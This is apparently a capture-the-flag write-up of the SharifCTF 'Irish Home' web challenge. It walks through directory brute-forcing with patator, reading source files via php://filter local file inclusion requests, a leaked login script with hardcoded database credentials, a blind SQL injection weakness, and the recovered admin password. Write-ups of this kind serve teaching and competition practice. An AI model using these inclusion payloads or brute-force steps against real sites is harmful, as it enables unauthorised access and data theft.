# Web - Irish Home

After some time looking at the site without founding anything, I started to find some other pages via brute-force, to this I used `patator`:
```
root@kali:~# patator http_fuzz url=http://ctf.sharif.edu:8082/FILE0.php 0=/usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -x ignore:code=404
00:08:48 patator    INFO - Starting Patator v0.5 (http://code.google.com/p/patator/) at 2016-12-19 00:08 CET
00:08:48 patator    INFO - 
00:08:48 patator    INFO - code size:clen     | candidate                        |   num | mesg
00:08:48 patator    INFO - ----------------------------------------------------------------------
00:08:51 patator    INFO - 200  4895:4491     | index                            |    15 | HTTP/1.1 200 OK
00:08:52 patator    INFO - 403  387:213       |                                  |    14 | HTTP/1.1 403 Forbidden
00:08:59 patator    INFO - 200  2466:2062     | login                            |    53 | HTTP/1.1 200 OK
00:09:27 patator    INFO - 200  1498:1094     | header                           |   191 | HTTP/1.1 200 OK
00:09:39 patator    INFO - 302  2342:1959     | admin                            |   259 | HTTP/1.1 302 Found
```

Ok, after this step, I though I was stuck but I still tried to perform some requests using Burp repeater, by chance, I tryed to request `admin.php`:  
```
GET /admin.php HTTP/1.1
Host: ctf.sharif.edu:8082

HTTP/1.1 302 Found
Server: nginx/1.6.1
Date: Sun, 18 Dec 2016 10:21:38 GMT
Content-Type: text/html; charset=UTF-8
Content-Length: 1959
Connection: close
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
Pragma: no-cache
Location: /login.php


<html>
<head>
	<meta charset="utf-8">
	<script src="https://storage.googleapis.com/code.getmdl.io/1.0.6/material.min.js"></script>
	<link rel="stylesheet" href="https://fonts.googleapis.com/icon?family=Material+Icons">
	<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/materialize/0.97.8/css/materialize.min.css">
	<link rel="stylesheet" href="http://ctf.sharif.edu/ctf7/static/style.css">
	<title>Irish Home</title>
</head>
<body>
	<nav>
		<div class="nav-wrapper">
			<a href="/index.php" class="brand-logo" style="margin-left: 1cm;">Irish Home</a>
			<a href="#" data-activates="side-nav" class="button-collapse"><i class="material-icons">menu</i></a>
			<ul id="nav-mobile" class="right hide-on-med-and-down">
												<li><a href="/login.php">Login</a>			</ul>
			<ul class="side-nav" id="side-nav" style="transform: translateX(-100%);">
				<li><a href="/index.php">Irish Home</a>
				<li><div class="divider"/>
												<li><a href="/login.php">Login</a>			</ul>
		</div>
	</nav>

	<div class="row">
		<div class="col s6 offset-s3">
			<div class="card-panel">

<table>
	<tr>
		<td>Page</td>
		<td>Actions</td>
	</tr>

	<tr>
		<td><a href="pages/show.php?page=blog">blog</a></td>
		<td>
		 		<a style="color: red" class="material-icons" href="delete.php?page=blog">delete</a>
		 		<a style="color: green" class="material-icons" href="edit.php?page=blog">edit</a>
	 		</td>
	<tr>
		<td><a href="pages/show.php?page=notice">notice</a></td>
		<td>
		 		<a style="color: red" class="material-icons" href="delete.php?page=notice">delete</a>
		 		<a style="color: green" class="material-icons" href="edit.php?page=notice">edit</a>
	 		</td>
</table>
</div>
</div>
</div>
<script src="http://ctf.sharif.edu/ctf7/static/jquery-3.1.1.min.js"></script>
<script src="http://ctf.sharif.edu/ctf7/static/materialize/js/materialize.min.js"></script>
<script>

	$(function () {
		$(".button-collapse").sideNav();
	})
</script>
</body>
</html>
```
So ok, the user is redirected but the content of the page is displayed. Here we can see some admin pages:
- `delete.php`: page used to delete content
- `edit.php`: page used to edit pages
- `pages/show.php`: page used to display content

After trying to access unsuccessfully to `deleted.php` and `edit.php` I tryed to use `show.php` and to include some files (in this order):
```
GET /pages/show.php?page=php://filter/convert.base64-encode/resource=../login HTTP/1.1
Host: ctf.sharif.edu:8082
   --> Allow to read the login function

GET /pages/show.php?page=php://filter/convert.base64-encode/resource=delete HTTP/1.1
Host: ctf.sharif.edu:8082
   --> Allow to get the location of the deleted files

GET /pages/show.php?page=php://filter/convert.base64-encode/resource=notice HTTP/1.1
Host: ctf.sharif.edu:8082
   --> Allow to get the name of the deleted file

GET /pages/show.php?page=php://filter/convert.base64-encode/resource=../deleted_3d5d9c1910e7c7/flag HTTP/1.1
Host: ctf.sharif.edu:8082
   --> Allow to get the format of the final flag
```

We now know the format of the flag and the username of the administrator, but we still don't have the flag neither the password:
```
$username = 'Cuchulainn';
$password = ;	// Oi don't save me bleedin password in a shithole loike dis.

$salt = 'd34340968a99292fb5665e';

$tmp = $username . $password . $salt;
$tmp = md5($tmp);

$flag = "SharifCTF{" . $tmp . "}";

echo $flag;
```
So we have to get the admin password, let's try to analyse the `login.php` file:
```
	if(!empty($_POST['username']) && !empty($_POST['password'])) {
		$username = $_POST['username'];
		$password = $_POST['password'];

		if(strpos($password, '"') !== false)
			$text = "SQL injection detected";
		else {
			$servername = "localhost";
			$db_username = "irish_user";
			$db_password = "3d2f27921e2c13e7b66e7b486b0feae3dde1ef25";
			$dbname = "irish_home";

			$conn = new mysqli($servername, $db_username, $db_password, $dbname);
			if ($conn->connect_error) {
				die("Connection failed: " . $conn->connect_error);
			}

			$sql = "SELECT * FROM users where username=\"$username\" and BINARY password=\"$password\"";

			$result = $conn->query($sql);

			if (!$result)
				trigger_error('Invalid query: ' . $conn->error);

			if ($result->num_rows > 0) {
				if(strpos($username, '"') !== false)
					$text = "SQL injection detected";
				else {
					$_SESSION['logged_in'] = $username;
					header('Location: /admin.php');
				}
			}
```
There we find something interresting ; in fact, there is a SQL detection mecanism used:
- If password contains double quote then an error is returned to the user
- Else the SQL request `"SELECT * FROM users where username=\"$username\" and BINARY password=\"$password\""` is performed :
    - If there is no result the standard error page is returned
    - Else :
        - If a double quote is found in the user name an error `"SQL injection detected"` is displayed to the user
        - Else the user is logged in

The validation scheme is vulnerable to blind SQL injection. In fact, we are able to know (using some SQL injection method) if the statement is true (standard error) or if it is false (error contains "SQL injection detected"). So after some try, we got the password and then the flag (thanks Iansus for the help !):
```
PASSWORD = 2a7da9c@088ba43a_9c1b4Xbyd231eb9
```
